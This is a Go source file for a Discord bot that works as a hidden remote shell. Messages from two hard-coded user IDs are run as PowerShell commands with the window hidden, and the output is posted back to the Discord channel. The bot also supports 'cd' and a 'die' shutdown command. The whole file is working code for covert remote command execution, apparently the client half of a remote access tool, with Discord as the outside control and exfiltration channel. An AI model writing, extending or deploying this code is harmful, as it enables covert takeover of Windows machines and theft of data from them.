package client_bot

import (
	"os"
	"os/signal"
	"os/exec"
	"syscall"
	"strings"
	"github.com/bwmarrin/discordgo"
)

var BotToken string
var output string
const UserID1 string = "ID"
const UserID2 string = "ID"


func Run() {
	// create session
	discSession, err := discordgo.New("Bot " + BotToken)
	if err != nil {
		os.Exit(2)
	}

	// create event handler
	discSession.AddHandler(NewMessage)

	// start session
	discSession.Open()

	// ctrl + C termination
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
 	<- c
}


func NewMessage(discSession *discordgo.Session, message *discordgo.MessageCreate) {

	// prevent bot responding to its own message
	if message.Author.ID == discSession.State.User.ID {
		return
	}

	// listen to adminID messages only
	if message.Author.ID == UserID1 || message.Author.ID == UserID2 {

		if strings.Contains(message.Content, "die") {
			// kill connection
			discSession.Close()
			os.Exit(1)

		} else if slice := strings.Fields(message.Content); slice[0] == "cd" {
			// change working directory
			err := os.Chdir(slice[1])
			cwd, _ := os.Getwd()
			output = "Working Directory -> " + cwd
			if err != nil {
				output = err.Error()
			} 
			
		} else {
			// execute cmd
			cmd := exec.Command("powershell", "-NoProfile", "-Command", message.Content)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			result, _ := cmd.CombinedOutput()
			output = string(result)
		}

		// send output of cmd
		discSession.ChannelMessageSend(message.ChannelID, output)
	}
}